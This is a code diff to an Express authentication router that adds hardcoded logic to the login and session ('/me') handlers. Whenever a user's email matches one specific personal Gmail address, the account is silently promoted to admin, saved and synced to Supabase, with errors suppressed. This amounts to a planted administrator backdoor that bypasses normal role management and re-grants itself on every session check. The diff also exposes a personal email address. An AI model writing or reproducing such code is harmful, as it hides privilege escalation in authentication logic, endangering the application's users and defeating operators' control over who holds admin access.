@@ -148,6 +148,12 @@ authRouter.post('/login', (req, res) => {
       return res.status(401).json({ error: 'Invalid email or password.' });
     }
 
+    if (email.toLowerCase() === 'mdtanvirkabirbiplob@gmail.com' && user.role !== 'admin') {
+      user.role = 'admin';
+      db.save();
+      db.syncUserToSupabase(user).catch(() => {});
+    }
+
     const token = createSessionToken(user);
     const profile = db.getProfileByUserId(user.id);
     const progress = db.getProgressByUserId(user.id);
@@ -195,6 +201,16 @@ authRouter.get('/me', (req: AuthenticatedRequest, res) => {
       user: null,
       message: 'Unauthenticated session'
     });
+  }
+
+  if (user.email?.toLowerCase() === 'mdtanvirkabirbiplob@gmail.com') {
+    user.role = 'admin';
+    const dbUser = db.findUserById(user.id) || db.findUserByEmail(user.email);
+    if (dbUser && dbUser.role !== 'admin') {
+      dbUser.role = 'admin';
+      db.save();
+      db.syncUserToSupabase(dbUser).catch(() => {});
+    }
   }
 
   const profile = db.getProfileByUserId(user.id);
